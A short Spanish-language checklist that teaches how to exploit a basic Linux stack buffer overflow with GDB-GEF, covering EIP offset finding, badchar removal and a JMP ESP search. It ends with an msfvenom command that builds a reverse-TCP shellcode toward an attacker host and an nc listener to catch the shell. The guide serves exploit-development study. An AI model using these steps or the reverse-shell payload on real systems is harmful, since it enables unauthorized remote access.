# Estructura básica del BoF en Linux
---
_Esta es una estructura básica de los pasos a seguir en Linux a la hora de explotar un Buffer Overflow básico y de los antiguos, para ello utilizaremos el programa "GDB-GEF"._

1. Crear un padding muy grande y ver si hay buffer overflow. Para ello:
 - Lanzar el comando: run
2. Tomar el control de EIP para ello:
 - Utilizaremos el comando "pattern create xxxx"
 - Ver EIP y ver que elementos tiene.
 - Hacer una resta a mano comparando donde empieza y donde acaba // utilizar comandos:
   - pattern offset "dirección EIP"
3. Una vez tenemos el control de EIP, sacaremos los badchars.
 - Crearemos una cadena con todos los bytes posibles con el comando --> bytearray
 - Ejecutamos de nuevo el programa.
 - Lo vemos manualmente: Hexdump $ESP 0x100 --> Vemos cuando se rompe la cadena de bytearray
 - Con comando: bincompare -f /home/..../bytearray.bin -a "ADDRESS" --> Nos indica los badchars
 - Volvemos a generar el bytearray eliminando los badchars y volvemos a empezar hasta que no quede ninguna.
4. Buscaremos en el programa un JMP ESP que no tenga ASLR.
 -  ropper --search "jmp esp"
 - Comprobamos que la direccion que seleccionamos no contiene badchars.
 - La colocamos en la direccion de retorno, que es EIP, el cual hemos controlado anteriormente.
5. Generar o buscar una shellcode/reverse shellcode.
````
msfvenom -p linux/shell/reverse_tcp LHOST=192.168.x.x LPORT=4444 EXITFUNC=thread -b '\x00\x0a\x09\x1a' -a x86 --platform linux -f python -v shellcode_reverse_shell
--smallest
````
6. Nos ponemos a la escucha:
````
 nc -lvnp 4444 // use exploit/multi/handler
````
7. Ejecutamos y... **FIN**
